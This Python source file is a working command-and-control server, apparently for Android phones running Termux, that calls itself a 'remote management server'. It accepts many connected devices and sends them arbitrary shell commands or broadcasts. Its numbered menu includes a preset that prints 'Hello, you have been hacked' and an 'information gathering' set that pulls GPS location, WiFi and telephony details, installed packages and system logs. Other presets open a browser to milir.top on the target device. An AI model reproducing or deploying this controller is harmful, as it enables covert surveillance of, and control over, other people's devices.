#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Termux远程管理服务器 - 修复菜单冲突版
全局菜单：字母快捷命令
二级菜单：全部使用数字
"""

import socket
import threading
import sys
import time

class FixedMenuServer:
    def __init__(self, port=8556):
        self.host = '0.0.0.0'
        self.port = port
        self.server = None
        self.clients = {}
        self.client_id = 0
        self.running = True
        self.current_client = None
        self.in_menu = False  # 是否在二级菜单中
        
        # 一级快捷命令（全局菜单）
        self.global_commands = {
            'l': 'list - 查看客户端列表',
            's': 'select <id> - 选择客户端',
            'b': 'broadcast - 广播模式',
            'c': 'clear - 清屏',
            'h': 'help - 显示帮助',
            'e': 'exit - 退出服务器',
            'm': 'menu - 显示功能菜单',
            'v': 'status - 查看客户端状态'
        }
        
        # 二级功能菜单（全部使用数字）
        self.function_menu = {
            # 基本功能 (1-9)
            '1': "echo '你好，您已被入侵'",
            '2': "uname -a && whoami",
            '3': "pwd && ls -la",
            '4': "termux-info",
            '5': "df -h",
            '6': "ps aux | head -10",
            '7': "ifconfig || ip addr",
            '8': "date",
            '9': "cat /proc/cpuinfo | grep 'model name' | head -1",
            '10': "free -h",
            
            # 网络功能 (11-19)
            '11': "termux-open-url http://milir.top",  # 打开浏览器
            '12': "ping -c 3 google.com",  # 网络测试
            '13': "curl -I http://milir.top",  # HTTP头部
            '14': "wget --spider http://milir.top",  # 网站检查
            '15': "netstat -tunlp 2>/dev/null || ss -tunlp",  # 网络连接
            
            # 系统功能 (20-29)
            '20': "top -n 1 | head -20",  # 系统状态
            '21': "du -sh ~/storage/shared 2>/dev/null || du -sh ~",  # 存储空间
            '22': "cat /sys/class/power_supply/battery/capacity 2>/dev/null || echo '无法获取电量'",  # 电池电量
            '23': "cat /proc/meminfo | grep -E 'MemTotal|MemFree|MemAvailable'",  # 内存详情
            '24': "cat /proc/cpuinfo",  # CPU详情
            '25': "cat /proc/version",  # 内核版本
            '26': "env | head -20",  # 环境变量
            
            # 文件操作 (30-39)
            '30': "find . -type f -name '*.py' | head -10",  # 查找Python文件
            '31': "find . -type f -size +1M | head -10",  # 查找大文件
            '32': "ls -la ~/storage/shared 2>/dev/null || ls -la ~",  # 存储目录
            
            # Termux功能 (40-49)
            '40': "termux-setup-storage",  # 设置存储
            '41': "termux-battery-status",  # 电池状态
            '42': "termux-wifi-connectioninfo",  # WiFi信息
            '43': "termux-location",  # 位置信息
            '44': "termux-telephony-deviceinfo",  # 设备信息
            
            # 信息收集 (50-59)
            '50': "getprop | grep -E 'ro.product|ro.build'",  # 设备属性
            '51': "logcat -d | tail -20",  # 日志查看
            '52': "pm list packages | head -20",  # 已安装包
            '53': "settings list system | head -10",  # 系统设置
        }
        
        # 客户端最后活动时间
        self.last_activity = {}
    
    def start(self):
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            
            print(f"[+] 服务器已启动")
            print(f"[+] 端口: {self.port}")
            print("[+] 等待客户端连接...")
            print("-" * 60)
            
            # 接受连接的线程
            accept_thread = threading.Thread(target=self.accept_clients)
            accept_thread.daemon = True
            accept_thread.start()
            
            # 启动心跳检测线程
            heartbeat_thread = threading.Thread(target=self.check_heartbeats)
            heartbeat_thread.daemon = True
            heartbeat_thread.start()
            
            self.control_loop()
            
        except Exception as e:
            print(f"[!] 错误: {e}")
        finally:
            self.stop()
    
    def accept_clients(self):
        """接受客户端连接"""
        while self.running:
            try:
                client_socket, client_addr = self.server.accept()
                
                self.client_id += 1
                client_id = self.client_id
                
                # 存储客户端
                self.clients[client_id] = {
                    'socket': client_socket,
                    'address': client_addr,
                    'connected_at': time.time()
                }
                
                # 记录活动时间
                self.last_activity[client_id] = time.time()
                
                print(f"\n[+] 客户端 #{client_id} 已连接: {client_addr}")
                print(f"[+] 当前客户端数: {len(self.clients)}")
                
                # 启动客户端处理线程
                thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_id, client_socket)
                )
                thread.daemon = True
                thread.start()
                
            except:
                pass
    
    def handle_client(self, client_id, client_socket):
        """处理客户端通信 - 静默处理心跳包"""
        try:
            while self.running and client_id in self.clients:
                try:
                    # 接收客户端响应
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    
                    response = data.decode('utf-8', errors='ignore').strip()
                    
                    # 更新最后活动时间
                    self.last_activity[client_id] = time.time()
                    
                    # 过滤心跳包 - 不显示HEARTBEAT开头的消息
                    if response and not response.startswith("HEARTBEAT"):
                        # 显示响应，每行前面加上客户端ID
                        lines = response.split('\n')
                        for line in lines:
                            if line.strip():
                                print(f"[客户端 #{client_id}]: {line}")
                        
                except:
                    break
                    
        finally:
            self.disconnect_client(client_id)
    
    def check_heartbeats(self):
        """检查客户端心跳，清理超时连接"""
        while self.running:
            time.sleep(30)  # 每30秒检查一次
            
            current_time = time.time()
            disconnected = []
            
            for client_id, last_time in self.last_activity.items():
                if current_time - last_time > 60:  # 60秒无活动
                    print(f"[!] 客户端 #{client_id} 心跳超时")
                    disconnected.append(client_id)
            
            for client_id in disconnected:
                self.disconnect_client(client_id)
    
    def disconnect_client(self, client_id):
        """断开客户端连接"""
        if client_id in self.clients:
            try:
                self.clients[client_id]['socket'].close()
            except:
                pass
            
            # 清理记录
            if client_id in self.last_activity:
                del self.last_activity[client_id]
            
            print(f"\n[-] 客户端 #{client_id} 已断开连接")
            del self.clients[client_id]
            print(f"[+] 剩余客户端: {len(self.clients)}")
            
            if self.current_client == client_id:
                self.current_client = None
                print("[!] 当前选择的客户端已断开，已取消选择")
    
    def send_command(self, client_id, command):
        """发送命令到指定客户端"""
        if client_id not in self.clients:
            print(f"[!] 客户端 #{client_id} 不存在")
            return False
        
        try:
            # 发送命令 - 使用特殊格式 CMD|命令内容
            message = f"CMD|{command}\n"
            self.clients[client_id]['socket'].send(message.encode('utf-8'))
            
            # 更新活动时间
            self.last_activity[client_id] = time.time()
            
            return True
        except Exception as e:
            print(f"[!] 发送失败: {e}")
            self.disconnect_client(client_id)
            return False
    
    def broadcast_command(self, command):
        """广播命令给所有客户端"""
        disconnected = []
        
        for client_id in list(self.clients.keys()):
            if not self.send_command(client_id, command):
                disconnected.append(client_id)
        
        for client_id in disconnected:
            if client_id in self.clients:
                self.disconnect_client(client_id)
    
    def control_loop(self):
        """主控制循环"""
        self.show_welcome()
        
        while self.running:
            try:
                # 显示不同的提示符
                if self.in_menu:
                    prompt = "功能菜单> "
                elif self.current_client:
                    prompt = f"[#{self.current_client}]> "
                else:
                    prompt = "服务器> "
                
                cmd = input(prompt).strip()
                
                if not cmd:
                    continue
                
                # 如果在二级菜单中
                if self.in_menu:
                    if cmd.lower() == 'back':
                        self.in_menu = False
                        print("[+] 退出功能菜单")
                        continue
                    
                    if cmd in self.function_menu:
                        if self.current_client:
                            command_text = self.function_menu[cmd]
                            print(f"[+] 发送功能 {cmd} 到客户端 #{self.current_client}")
                            print(f"    命令: {command_text[:50]}...")
                            self.send_command(self.current_client, command_text)
                        else:
                            print("[!] 请先选择客户端")
                    else:
                        print(f"[!] 无效功能编号: {cmd}")
                        print("[!] 输入 'back' 返回")
                    continue
                
                # 全局命令处理（不在菜单中时）
                if self.process_global_command(cmd):
                    continue
                
                # 如果选择了客户端，直接发送命令
                if self.current_client and cmd:
                    if self.send_command(self.current_client, cmd):
                        print(f"[+] 命令已发送到客户端 #{self.current_client}")
                
                # 如果没有选择客户端且不是上述命令
                elif not self.current_client and cmd:
                    print("[!] 请先选择客户端 (s <id>) 或使用广播模式 (b)")
                    print("[!] 输入 'h' 查看帮助")
                    
            except KeyboardInterrupt:
                print("\n[!] 使用 'e' 或 'exit' 命令退出")
            except EOFError:
                # 处理Ctrl+D
                print("\n[!] 使用 'exit' 命令退出")
            except Exception as e:
                print(f"[!] 错误: {e}")
    
    def process_global_command(self, cmd):
        """处理全局快捷命令"""
        # 清屏命令
        if cmd in ['c', 'clear']:
            print("\n" * 50)
            return True
        
        # 帮助命令
        if cmd in ['h', 'help']:
            self.show_help()
            return True
        
        # 退出命令
        if cmd in ['e', 'exit', 'quit', 'q']:
            print("[+] 正在关闭服务器...")
            self.running = False
            return True
        
        # 显示客户端列表
        if cmd in ['l', 'list']:
            self.show_clients()
            return True
        
        # 显示客户端状态
        if cmd in ['v', 'status']:
            self.show_client_status()
            return True
        
        # 显示功能菜单
        if cmd in ['m', 'menu']:
            if self.current_client:
                self.show_function_menu()
            else:
                print("[!] 请先选择客户端 (s <id>)")
            return True
        
        # 广播模式
        if cmd in ['b', 'broadcast']:
            if self.current_client:
                # 如果是已选择客户端，取消选择
                print(f"[+] 已取消选择客户端 #{self.current_client}")
                self.current_client = None
            else:
                # 进入广播模式
                self.broadcast_mode()
            return True
        
        # 选择客户端命令
        if (cmd.startswith('s ') or cmd.startswith('select ')) and len(cmd.split()) == 2:
            try:
                client_id = int(cmd.split()[1])
                if client_id in self.clients:
                    self.current_client = client_id
                    print(f"[+] 已选择客户端 #{client_id}")
                else:
                    print(f"[!] 客户端 #{client_id} 不存在")
            except:
                print("[!] 用法: s <客户端ID> 或 select <客户端ID>")
            return True
        
        # 取消选择客户端
        if cmd in ['back', 'unselect']:
            if self.current_client:
                print(f"[+] 已取消选择客户端 #{self.current_client}")
                self.current_client = None
            else:
                print("[!] 没有选择的客户端")
            return True
        
        return False
    
    def show_function_menu(self):
        """显示功能菜单（二级菜单）"""
        self.in_menu = True
        print("\n" + "="*60)
        print(f"功能菜单 - 客户端 #{self.current_client}")
        print("="*60)
        print("输入数字选择功能，输入 'back' 返回")
        print("-" * 60)
        
        # 按功能类型分组显示
        menu_groups = {
            "基本功能 (1-10)": [str(i) for i in range(1, 11)],
            "网络功能 (11-19)": [str(i) for i in range(11, 20)],
            "系统功能 (20-29)": [str(i) for i in range(20, 30)],
            "文件操作 (30-39)": [str(i) for i in range(30, 33)],
            "Termux功能 (40-49)": [str(i) for i in range(40, 45)],
            "信息收集 (50-59)": [str(i) for i in range(50, 54)],
        }
        
        for group_name, keys in menu_groups.items():
            print(f"\n{group_name}:")
            for key in keys:
                if key in self.function_menu:
                    cmd = self.function_menu[key]
                    # 获取简短的描述
                    description = self.get_menu_description(cmd)
                    print(f"  [{key:2}] {description}")
        
        print("\n" + "="*60)
        print("示例: 输入 '1' 显示入侵消息")
        print("      输入 '11' 打开浏览器")
        print("      输入 'back' 返回")
        print("="*60)
    
    def get_menu_description(self, command):
        """获取命令的简要描述"""
        descriptions = {
            "echo '你好，您已被入侵'": "显示入侵消息",
            "uname -a && whoami": "系统信息和用户",
            "pwd && ls -la": "当前目录和文件列表",
            "termux-info": "Termux系统信息",
            "df -h": "磁盘使用情况",
            "ps aux | head -10": "进程列表",
            "ifconfig || ip addr": "网络接口信息",
            "date": "当前日期时间",
            "cat /proc/cpuinfo | grep 'model name' | head -1": "CPU型号",
            "free -h": "内存使用情况",
            "termux-open-url http://milir.top": "打开浏览器",
            "ping -c 3 google.com": "网络测试",
            "curl -I http://milir.top": "HTTP头部检查",
            "wget --spider http://milir.top": "网站连通性",
            "netstat -tunlp 2>/dev/null || ss -tunlp": "网络连接",
            "top -n 1 | head -20": "系统状态监控",
            "du -sh ~/storage/shared 2>/dev/null || du -sh ~": "存储空间使用",
            "cat /sys/class/power_supply/battery/capacity 2>/dev/null || echo '无法获取电量'": "电池电量",
            "cat /proc/meminfo | grep -E 'MemTotal|MemFree|MemAvailable'": "内存详细信息",
            "cat /proc/cpuinfo": "CPU详细信息",
            "cat /proc/version": "内核版本信息",
            "env | head -20": "环境变量",
            "find . -type f -name '*.py' | head -10": "查找Python文件",
            "find . -type f -size +1M | head -10": "查找大文件",
            "ls -la ~/storage/shared 2>/dev/null || ls -la ~": "存储目录",
            "termux-setup-storage": "设置存储权限",
            "termux-battery-status": "电池状态",
            "termux-wifi-connectioninfo": "WiFi连接信息",
            "termux-location": "获取位置",
            "termux-telephony-deviceinfo": "设备信息",
            "getprop | grep -E 'ro.product|ro.build'": "设备属性",
            "logcat -d | tail -20": "系统日志",
            "pm list packages | head -20": "已安装包",
            "settings list system | head -10": "系统设置",
        }
        
        # 返回匹配的描述或截短的命令
        for key, desc in descriptions.items():
            if command.startswith(key.split()[0]):  # 匹配第一个单词
                return desc
        
        return command[:40] + "..." if len(command) > 40 else command
    
    def broadcast_mode(self):
        """广播模式"""
        if not self.clients:
            print("[!] 没有客户端连接")
            return
        
        print(f"\n[广播模式] 命令将发送给所有 {len(self.clients)} 个客户端")
        print("输入 'back' 返回，'menu' 显示功能菜单")
        
        while True:
            cmd = input("广播> ").strip()
            
            if cmd.lower() == "back":
                break
            
            if cmd.lower() == "menu":
                self.show_broadcast_menu()
                continue
            
            if cmd:
                self.broadcast_command(cmd)
                print(f"[+] 命令已广播给 {len(self.clients)} 个客户端")
    
    def show_broadcast_menu(self):
        """广播模式功能菜单"""
        print("\n广播功能菜单:")
        print("-" * 60)
        print("输入数字选择功能，输入 'back' 返回")
        
        # 显示常用功能
        common_functions = {
            '1': "echo '你好，您已被入侵'",
            '2': "uname -a && whoami",
            '3': "pwd && ls -la",
            '11': "termux-open-url http://milir.top",
            '12': "ping -c 3 google.com",
        }
        
        for key, cmd in common_functions.items():
            description = self.get_menu_description(cmd)
            print(f"  [{key}] {description}")
        
        print("\n输入其他数字功能编号 (1-53) 也可使用")
        print("-" * 60)
        
        while True:
            choice = input("广播菜单> ").strip()
            
            if choice.lower() == 'back':
                break
            
            if choice in self.function_menu:
                print(f"[+] 广播功能 {choice}...")
                self.broadcast_command(self.function_menu[choice])
            else:
                print(f"[!] 无效功能编号: {choice}")
    
    def show_welcome(self):
        """显示欢迎信息和帮助"""
        print("\n" + "="*60)
        print("Termux远程管理服务器 - 修复菜单冲突版")
        print("="*60)
        print("全局快捷命令:")
        for key, desc in self.global_commands.items():
            print(f"  {key} - {desc}")
        print("\n选择客户端后，输入 'm' 显示功能菜单")
        print("功能菜单全部使用数字编号，无字母冲突")
        print("="*60)
    
    def show_help(self):
        """显示详细帮助信息"""
        print("\n" + "="*60)
        print("详细帮助信息")
        print("="*60)
        
        print("\n【全局命令】")
        for key, desc in self.global_commands.items():
            print(f"  {key} - {desc}")
        
        print("\n【使用流程】")
        print("  1. 输入 'l' 查看客户端列表")
        print("  2. 输入 's 1' 选择客户端1")
        print("  3. 输入 'm' 进入功能菜单")
        print("  4. 在功能菜单中输入数字选择功能")
        print("  5. 输入 'back' 返回")
        
        print("\n【功能菜单特点】")
        print("  - 全部使用数字编号 (1-53)")
        print("  - 无字母冲突问题")
        print("  - 支持两位数字功能")
        print("  - 按功能类型分组显示")
        
        print("\n【常用功能示例】")
        print("  1 - 显示入侵消息")
        print("  2 - 系统信息")
        print("  11 - 打开浏览器")
        print("  20 - 系统状态监控")
        print("="*60)
    
    def show_clients(self):
        """显示所有客户端"""
        if not self.clients:
            print("[!] 没有客户端连接")
            return
        
        print(f"\n已连接客户端 ({len(self.clients)}个):")
        print("-" * 60)
        for client_id, info in self.clients.items():
            addr = info['address']
            connected_time = time.time() - info['connected_at']
            status = "✓ 已选择" if client_id == self.current_client else "○ 未选择"
            print(f"  #{client_id}: {addr[0]:<15}:{addr[1]:<5} [连接: {connected_time:.0f}秒] [{status}]")
    
    def show_client_status(self):
        """显示客户端状态（包括心跳）"""
        if not self.clients:
            print("[!] 没有客户端连接")
            return
        
        current_time = time.time()
        print(f"\n客户端状态 ({len(self.clients)}个):")
        print("-" * 60)
        for client_id, info in self.clients.items():
            addr = info['address']
            
            # 计算最后活动时间
            last_active = self.last_activity.get(client_id, 0)
            inactive_time = current_time - last_active
            
            # 状态判断
            if inactive_time < 10:
                status = "✓ 活跃"
            elif inactive_time < 30:
                status = "○ 正常"
            elif inactive_time < 60:
                status = "⚠ 警告"
            else:
                status = "✗ 超时"
            
            print(f"  #{client_id}: {addr[0]:<15}")
            print(f"      端口: {addr[1]:<5} | 状态: {status}")
            print(f"      最后活动: {inactive_time:.1f}秒前")
            print(f"      已连接: {time.time() - info['connected_at']:.0f}秒")
    
    def stop(self):
        """停止服务器"""
        self.running = False
        
        # 关闭所有客户端连接
        for client_id in list(self.clients.keys()):
            self.disconnect_client(client_id)
        
        if self.server:
            try:
                self.server.close()
            except:
                pass
        
        print("[+] 服务器已关闭")

if __name__ == "__main__":
    server = FixedMenuServer(8556)
    server.start()